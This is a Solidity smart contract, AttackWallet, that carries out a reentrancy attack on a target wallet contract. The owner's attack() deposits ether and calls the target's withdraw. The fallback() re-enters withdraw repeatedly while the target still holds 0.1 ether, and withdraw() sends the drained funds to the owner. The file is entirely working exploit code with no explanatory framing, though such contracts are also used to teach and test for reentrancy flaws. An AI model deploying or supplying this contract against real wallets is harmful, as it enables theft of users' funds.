// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract AttackWallet {
    event WithdrawalSuccessfulEvent();
    event WithdrawalFailedEvent();

    address public wallet;
    uint256 public constant AMOUNT = 0.1 ether;
    address immutable owner;
    uint256 private counter;

    modifier onlyOwner() {
        require(msg.sender == owner, "You are not the owner");
        _;
    }

    constructor(address _wallet) {
        wallet = _wallet;
        owner = msg.sender;
    }

    fallback() external payable {
        // attack();
        if (wallet.balance >= AMOUNT) {
            (bool ok,) = wallet.call(abi.encodeWithSignature("withdraw(uint256)", AMOUNT));
            require(ok, "withdraw failed fallback");
        }
    }

    function attack() external payable onlyOwner {
        if (msg.value >= AMOUNT) {
            (bool depositted,) = wallet.call{value: msg.value}(abi.encodeWithSignature("deposit(address)", address(this)));
            require(depositted, "withdraw failed fallback");
            (bool ok,) = wallet.call(abi.encodeWithSignature("withdraw(uint256)", AMOUNT));
            if (ok) {
                emit WithdrawalSuccessfulEvent();
                return;
            } else {
                emit WithdrawalFailedEvent();
            }

            require(ok, "withdraw failed attack");
        }
    }

    function checkWithdrawalAmount() public view returns (bool) {
        return wallet.balance >= AMOUNT;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }
}
